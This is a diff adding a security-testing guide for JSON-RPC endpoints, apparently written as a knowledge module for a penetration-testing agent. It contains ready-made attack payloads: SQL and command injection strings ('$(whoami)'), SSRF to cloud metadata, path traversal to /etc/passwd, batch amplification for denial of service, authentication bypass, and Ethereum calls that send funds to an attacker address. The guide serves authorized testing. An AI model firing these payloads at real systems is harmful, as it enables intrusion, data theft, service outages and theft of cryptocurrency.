@@ -1,0 +1,384 @@
+<json_rpc_guide>
+<title>JSON-RPC SECURITY TESTING</title>
+
+<critical>JSON-RPC is a stateless, lightweight remote procedure call protocol used in blockchain, microservices, and API communications. Security vulnerabilities include method enumeration, parameter injection, batch request abuse, and authentication bypass. JSON-RPC's simplicity can mask significant attack surfaces.</critical>
+
+<scope>
+- Method discovery and enumeration
+- Parameter manipulation and injection
+- Batch request exploitation
+- Authentication and authorization bypass
+- Notification abuse
+- Error information disclosure
+- Version-specific vulnerabilities (1.0 vs 2.0)
+</scope>
+
+<methodology>
+1. Identify JSON-RPC endpoints and version.
+2. Enumerate available methods through introspection or fuzzing.
+3. Test parameter handling for injection vulnerabilities.
+4. Probe batch requests for amplification and bypass.
+5. Analyze error responses for information disclosure.
+</methodology>
+
+<protocol_basics>
+<json_rpc_2_structure>
+{% raw %}
+# JSON-RPC 2.0 Request format:
+{
+  "jsonrpc": "2.0",
+  "method": "methodName",
+  "params": [param1, param2] or {"key": "value"},
+  "id": 1
+}
+
+# JSON-RPC 2.0 Response format:
+{
+  "jsonrpc": "2.0",
+  "result": {...},
+  "id": 1
+}
+
+# Error response:
+{
+  "jsonrpc": "2.0",
+  "error": {
+    "code": -32600,
+    "message": "Invalid Request",
+    "data": "Additional info"
+  },
+  "id": null
+}
+
+# Notification (no response expected):
+{
+  "jsonrpc": "2.0",
+  "method": "notify",
+  "params": {...}
+  // No "id" field
+}
+{% endraw %}
+</json_rpc_2_structure>
+
+<error_codes>
+{% raw %}
+# Standard JSON-RPC 2.0 Error Codes:
+-32700  # Parse error
+-32600  # Invalid Request
+-32601  # Method not found
+-32602  # Invalid params
+-32603  # Internal error
+
+# -32000 to -32099: Server error (implementation-defined)
+{% endraw %}
+</error_codes>
+</protocol_basics>
+
+<method_enumeration>
+<introspection>
+{% raw %}
+# JSON-RPC introspection methods (if available):
+{"jsonrpc": "2.0", "method": "system.listMethods", "id": 1}
+{"jsonrpc": "2.0", "method": "rpc.discover", "id": 1}
+{"jsonrpc": "2.0", "method": "__list_methods__", "id": 1}
+
+# Method signature discovery:
+{"jsonrpc": "2.0", "method": "system.methodSignature", "params": ["methodName"], "id": 1}
+{"jsonrpc": "2.0", "method": "system.methodHelp", "params": ["methodName"], "id": 1}
+
+# OpenRPC discovery:
+{"jsonrpc": "2.0", "method": "rpc.discover", "id": 1}
+{% endraw %}
+</introspection>
+
+<method_fuzzing>
+{% raw %}
+# Common method names to test:
+# Authentication:
+login, authenticate, auth, signin, getToken
+
+# User operations:
+getUser, createUser, updateUser, deleteUser, listUsers
+
+# Admin functions:
+admin, adminPanel, getConfig, setConfig, restart
+
+# Debug/internal:
+debug, trace, eval, execute, system
+
+# Blockchain-specific:
+eth_accounts, eth_sendTransaction, personal_unlockAccount
+
+# Database:
+query, execute, find, insert, update, delete
+{% endraw %}
+</method_fuzzing>
+
+<differential_enumeration>
+{% raw %}
+# Compare responses for existing vs non-existing methods:
+
+# Non-existing method:
+{"jsonrpc": "2.0", "method": "nonexistent_xyz", "id": 1}
+# Response: "Method not found"
+
+# Existing method (wrong params):
+{"jsonrpc": "2.0", "method": "existing_method", "id": 1}
+# Response: "Invalid params" or different error
+
+# Use response differences to enumerate methods
+{% endraw %}
+</differential_enumeration>
+</method_enumeration>
+
+<parameter_attacks>
+<type_confusion>
+{% raw %}
+# Test parameter type handling:
+
+# Expected: string
+{"method": "getUser", "params": ["admin"], "id": 1}
+
+# Type confusion:
+{"method": "getUser", "params": [123], "id": 1}
+{"method": "getUser", "params": [true], "id": 1}
+{"method": "getUser", "params": [null], "id": 1}
+{"method": "getUser", "params": [{"$ne": ""}], "id": 1}
+
+# Array vs object params:
+{"method": "test", "params": ["val1", "val2"], "id": 1}
+{"method": "test", "params": {"key": "val1"}, "id": 1}
+{% endraw %}
+</type_confusion>
+
+<injection_attacks>
+{% raw %}
+# SQL injection via parameters:
+{"method": "search", "params": ["'; DROP TABLE users; --"], "id": 1}
+
+# NoSQL injection:
+{"method": "getUser", "params": [{"$gt": ""}], "id": 1}
+{"method": "find", "params": [{"$where": "1==1"}], "id": 1}
+
+# Command injection:
+{"method": "process", "params": ["; id; #"], "id": 1}
+{"method": "execute", "params": ["$(whoami)"], "id": 1}
+
+# SSRF via parameters:
+{"method": "fetch", "params": ["http://169.254.169.254/latest/meta-data/"], "id": 1}
+
+# Path traversal:
+{"method": "readFile", "params": ["../../../etc/passwd"], "id": 1}
+{% endraw %}
+</injection_attacks>
+
+<named_params_manipulation>
+{% raw %}
+# Named parameters (object style):
+{"method": "createUser", "params": {
+  "username": "attacker",
+  "role": "admin",  // Unauthorized role assignment
+  "isAdmin": true   // Extra parameter injection
+}, "id": 1}
+
+# Duplicate keys (parser-dependent):
+{"method": "transfer", "params": {
+  "amount": 1,
+  "amount": 1000000
+}, "id": 1}
+{% endraw %}
+</named_params_manipulation>
+</parameter_attacks>
+
+<batch_attacks>
+<batch_amplification>
+{% raw %}
+# JSON-RPC 2.0 batch request:
+[
+  {"jsonrpc": "2.0", "method": "method1", "id": 1},
+  {"jsonrpc": "2.0", "method": "method2", "id": 2},
+  ...
+]
+
+# Amplification attack (DoS):
+# Send batch with 1000s of requests
+[
+  {"jsonrpc": "2.0", "method": "expensive_operation", "id": 1},
+  {"jsonrpc": "2.0", "method": "expensive_operation", "id": 2},
+  // ... repeat 10000 times
+]
+
+# Rate limit bypass:
+# If rate limiting per-request, batch may bypass
+{% endraw %}
+</batch_amplification>
+
+<mixed_batch_attacks>
+{% raw %}
+# Mix valid and malicious requests:
+[
+  {"jsonrpc": "2.0", "method": "legitimate", "id": 1},
+  {"jsonrpc": "2.0", "method": "admin_only", "id": 2},
+  {"jsonrpc": "2.0", "method": "legitimate", "id": 3}
+]
+
+# Auth bypass via batch:
+# If first request authenticated, later requests may inherit
+[
+  {"jsonrpc": "2.0", "method": "login", "params": [...], "id": 1},
+  {"jsonrpc": "2.0", "method": "admin_action", "id": 2}
+]
+{% endraw %}
+</mixed_batch_attacks>
+</batch_attacks>
+
+<notification_abuse>
+<notification_attacks>
+{% raw %}
+# Notifications (no id = no response):
+{"jsonrpc": "2.0", "method": "log", "params": ["injected log entry"]}
+
+# Fire-and-forget attacks:
+# No response means no error feedback
+{"jsonrpc": "2.0", "method": "delete", "params": ["*"]}
+
+# Async operation abuse:
+{"jsonrpc": "2.0", "method": "processBackground", "params": ["malicious"]}
+{% endraw %}
+</notification_abuse>
+</notification_abuse>
+
+<authentication_bypass>
+<auth_testing>
+{% raw %}
+# Test for missing authentication:
+{"jsonrpc": "2.0", "method": "getUsers", "id": 1}
+# Should require auth but may not
+
+# Method-level auth bypass:
+# Auth on some methods, not others
+{"jsonrpc": "2.0", "method": "publicMethod", "id": 1}  // OK
+{"jsonrpc": "2.0", "method": "privateMethod", "id": 2} // Missing auth?
+
+# Token in params vs header:
+{"jsonrpc": "2.0", "method": "action", "params": {
+  "token": "stolen_token",
+  "action": "privileged"
+}, "id": 1}
+{% endraw %}
+</auth_testing>
+
+<session_manipulation>
+{% raw %}
+# Session ID manipulation:
+{"jsonrpc": "2.0", "method": "getSession", "params": ["other_session_id"], "id": 1}
+
+# Impersonation via params:
+{"jsonrpc": "2.0", "method": "action", "params": {
+  "userId": "admin_user_id"
+}, "id": 1}
+{% endraw %}
+</session_manipulation>
+</authentication_bypass>
+
+<blockchain_specific>
+<ethereum_rpc>
+{% raw %}
+# Ethereum JSON-RPC methods:
+
+# Account enumeration:
+{"jsonrpc": "2.0", "method": "eth_accounts", "id": 1}
+
+# Transaction sending (if unlocked):
+{"jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{
+  "from": "0x...",
+  "to": "0xattacker...",
+  "value": "0xFFFFFFFF"
+}], "id": 1}
+
+# Unlock account (if available):
+{"jsonrpc": "2.0", "method": "personal_unlockAccount", "params": [
+  "0xaccount", "password", 300
+], "id": 1}
+
+# Debug methods (if enabled):
+{"jsonrpc": "2.0", "method": "debug_traceTransaction", "params": [...], "id": 1}
+{% endraw %}
+</ethereum_rpc>
+</blockchain_specific>
+
+<error_exploitation>
+<info_disclosure>
+{% raw %}
+# Trigger errors for information:
+{"jsonrpc": "2.0", "method": "query", "params": [null], "id": 1}
+# Error may reveal: database type, query structure, file paths
+
+# Stack trace extraction:
+{"jsonrpc": "2.0", "method": "method", "params": [{"__proto__": {}}], "id": 1}
+
+# Version disclosure:
+{"jsonrpc": "1.0", "method": "test", "id": 1}  // Version mismatch error
+{% endraw %}
+</info_disclosure>
+</error_exploitation>
+
+<common_payloads>
+{% raw %}
+# Method enumeration:
+{"jsonrpc": "2.0", "method": "system.listMethods", "id": 1}
+
+# Parameter injection:
+{"jsonrpc": "2.0", "method": "query", "params": ["'; DROP TABLE x; --"], "id": 1}
+
+# Batch attack:
+[{"jsonrpc": "2.0", "method": "expensive", "id": i} for i in range(10000)]
+
+# Type confusion:
+{"jsonrpc": "2.0", "method": "getUser", "params": [{"$ne": ""}], "id": 1}
+
+# Auth bypass:
+{"jsonrpc": "2.0", "method": "admin", "params": {"userId": "admin"}, "id": 1}
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate method enumeration revealing hidden functionality.
+2. Show parameter injection leading to data access or execution.
+3. Prove batch request abuse for amplification or auth bypass.
+4. Document authentication bypass on sensitive methods.
+5. Provide evidence of information disclosure via error messages.
+</validation>
+
+<false_positives>
+- Only whitelisted methods exposed
+- Strong input validation on all parameters
+- Authentication enforced on all methods
+- Batch requests properly rate-limited
+- Error messages sanitized
+</false_positives>
+
+<impact>
+- Unauthorized method access and execution
+- Data theft via injection attacks
+- Denial of service through batch amplification
+- Authentication and authorization bypass
+- Blockchain fund theft (crypto applications)
+- Remote code execution via unsafe methods
+</impact>
+
+<pro_tips>
+1. Always test for introspection methods first.
+2. Compare error messages for existing vs non-existing methods.
+3. Batch requests often bypass rate limiting.
+4. Named parameters allow extra field injection.
+5. Notifications are fire-and-forget - no feedback.
+6. Blockchain RPC often lacks authentication.
+7. Debug methods are high-value targets.
+8. Type confusion reveals validation weaknesses.
+9. Mixed batch requests can bypass auth checks.
+10. Error messages often leak implementation details.
+</pro_tips>
+
+<remember>JSON-RPC's simple structure can hide complex security issues. Method enumeration, parameter injection, and batch abuse are the primary attack vectors. Always test both positional and named parameters, and remember that notifications receive no error feedback.</remember>
+</json_rpc_guide>
